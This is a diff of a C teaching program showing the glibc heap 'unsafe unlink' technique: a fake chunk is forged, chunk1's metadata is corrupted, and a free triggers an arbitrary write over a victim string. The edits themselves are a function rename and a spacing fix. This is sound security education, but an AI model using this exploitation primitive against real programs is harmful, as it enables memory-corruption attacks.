@@ -7,7 +7,7 @@
 uint64_t* pointer_vector[10];
 
 
-void print_pointer_vectors(){
+void print_pointer_vector(){
 	int i;
 	for(i=0;i<2;i++){
 		printf("pointer_vector[%d]: %p --> %p\n",i,&(pointer_vector[i]),pointer_vector[i]);
@@ -30,7 +30,7 @@ int main()
 	pointer_vector[0] = (uint64_t*) malloc(malloc_size); //chunk0
 	pointer_vector[1] = (uint64_t*) malloc(malloc_size); //chunk1
 	printf("The pointer vector starts at: %p\n",&(pointer_vector[0]));
-	print_pointer_vectors();
+	print_pointer_vector();
 	
 	printf("We create a fake chunk inside in the first allocated region.\n");
 	printf("We setup the 'next_free_chunk' (fd) of our fake chunk to point near to pointer_vector[0] so that P->fd->bk = P.\n");
@@ -39,7 +39,7 @@ int main()
 	printf("With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) != False\n");
 	pointer_vector[0][3] = (uint64_t) &(pointer_vector[0])-(sizeof(uint64_t)*2);
 	printf("Fake chunk fd: %p\n",(void*) pointer_vector[0][2]);
-	printf("Fake chunk  bk: %p\n",(void*) pointer_vector[0][3]);
+	printf("Fake chunk bk: %p\n",(void*) pointer_vector[0][3]);
 
 	printf("We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
 	uint64_t* chunk1_ptr = pointer_vector[1] - header_size;
@@ -51,13 +51,13 @@ int main()
 	
 	printf("Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting pointer_vector[0].\n");
 	free(pointer_vector[1]);
-	print_pointer_vectors();
+	print_pointer_vector();
 
 	printf("At this point we can use pointer_vector[0] to overwrite itself (or any other pointer in pointer_vector) to an arbitrary location.\n");
 	char victim_string[8];
 	strcpy(victim_string,"Hello!~");
 	pointer_vector[0][3] = (uint64_t) victim_string;
-	print_pointer_vectors();
+	print_pointer_vector();
 
 	printf("pointer_vector[0] is now pointing where we want, we use it to overwrite our victim string.\n");
 	printf("Original value: %s\n",victim_string);
